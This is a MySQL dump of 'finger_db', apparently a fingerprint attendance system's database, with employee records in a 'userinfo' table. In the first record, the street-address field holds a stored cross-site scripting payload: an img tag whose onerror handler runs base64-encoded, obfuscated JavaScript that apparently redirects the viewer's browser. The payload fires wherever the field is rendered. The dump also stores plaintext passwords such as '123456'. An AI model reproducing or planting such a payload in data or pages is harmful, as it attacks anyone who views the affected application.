DROP TABLE IF EXISTS `userinfo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `userinfo` (
  `userid` int(11) NOT NULL AUTO_INCREMENT,
  `badgenumber` varchar(20) CHARACTER SET utf8mb3 NOT NULL,
  `defaultdeptid` int(11) DEFAULT NULL,
  `name` varchar(900) CHARACTER SET utf8mb3 DEFAULT NULL,
  `Password` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `Card` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `Privilege` int(11) DEFAULT NULL,
  `AccGroup` int(11) DEFAULT NULL,
  `TimeZones` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `Gender` varchar(2) CHARACTER SET utf8mb3 DEFAULT NULL,
  `Birthday` datetime DEFAULT NULL,
  `street` varchar(900) CHARACTER SET utf8mb3 DEFAULT NULL,
  `zip` varchar(6) CHARACTER SET utf8mb3 DEFAULT NULL,
  `ophone` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `FPHONE` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `pager` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `minzu` varchar(8) CHARACTER SET utf8mb3 DEFAULT NULL,
  `title` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `SN` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `SSN` varchar(20) CHARACTER SET utf8mb3 DEFAULT NULL,
  `UTime` datetime DEFAULT NULL,
  `Hiredday` date DEFAULT NULL,
  `VERIFICATIONMETHOD` smallint(6) DEFAULT NULL,
  `State` varchar(2) CHARACTER SET utf8mb3 DEFAULT NULL,
  `City` varchar(2) CHARACTER SET utf8mb3 DEFAULT NULL,
  `SECURITYFLAGS` smallint(6) DEFAULT NULL,
  `ATT` tinyint(1) DEFAULT NULL,
  `OverTime` tinyint(1) DEFAULT NULL,
  `Holiday` tinyint(1) DEFAULT NULL,
  `INLATE` smallint(6) DEFAULT NULL,
  `OutEarly` smallint(6) DEFAULT NULL,
  `Lunchduration` smallint(6) DEFAULT NULL,
  `MVerifyPass` varchar(2) CHARACTER SET utf8mb3 DEFAULT NULL,
  `SEP` smallint(6) DEFAULT NULL,
  `OffDuty` smallint(6) NOT NULL,
  `DelTag` smallint(6) NOT NULL,
  `AutoSchPlan` smallint(6) DEFAULT NULL,
  `MinAutoSchInterval` int(11) DEFAULT NULL,
  `RegisterOT` int(11) DEFAULT NULL,
  `Image_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`userid`),
  KEY `userinfo_defaultdeptid` (`defaultdeptid`),
  KEY `userinfo_SN` (`SN`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `userinfo`
--

LOCK TABLES `userinfo` WRITE;
/*!40000 ALTER TABLE `userinfo` DISABLE KEYS */;
INSERT INTO `userinfo` VALUES (1,'000000012',1,'Amara Tania','','',NULL,NULL,'','M',NULL,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','','','','','','','10000001',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL),(2,'000000004',1,'Fajar Kita Nakita','','',NULL,1,'0000000100000000',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'A3AG223160114',NULL,'2022-11-30 10:45:38',NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL),(3,'000000001',1,'Mawar Alami','123456','',NULL,1,'0000000100000000',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'A3AG223160114',NULL,'2022-11-30 10:45:38',NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL),(4,'000000002',1,'Tebbo Sisani','','',NULL,1,'0000000100000000',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'A3AG223160114',NULL,'2022-11-30 10:45:38',NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL),(5,'000000003',1,'Kumpara Sojo','123456','',NULL,1,'0000000100000000',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'A3AG223160114',NULL,'2022-11-30 10:45:38',NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL),(6,'000000005',1,'Unif Ujung','','',NULL,1,'0000000100000000',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'A3AG223160114',NULL,'2022-11-30 10:48:18',NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL),(7,'000000006',1,'Mamat Alkali','','',NULL,1,'0000000100000000',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'A3AG223160114',NULL,'2022-11-30 13:52:40',NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL),(8,'000000007',1,'Boga Rantina','','',NULL,1,'0000000100000000',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'A3AG223160114',NULL,'2022-12-01 00:27:24',NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL),(9,'000000008',1,'Akira Triwulan','','',NULL,1,'0000000100000000',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'A3AG223160114',NULL,'2022-12-01 14:29:24',NULL,NULL,NULL,NULL,NULL,1,0,0,0,0,1,NULL,1,0,0,1,24,1,NULL);
/*!40000 ALTER TABLE `userinfo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `useruusedsclasses`
--

DROP TABLE IF EXISTS `useruusedsclasses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `useruusedsclasses` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `UserId` int(11) NOT NULL,
  `SchId` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UserId` (`UserId`,`SchId`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `useruusedsclasses`
--

LOCK TABLES `useruusedsclasses` WRITE;
/*!40000 ALTER TABLE `useruusedsclasses` DISABLE KEYS */;
/*!40000 ALTER TABLE `useruusedsclasses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping events for database 'finger_db'
--

--
-- Dumping routines for database 'finger_db'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-01-27 11:25:52
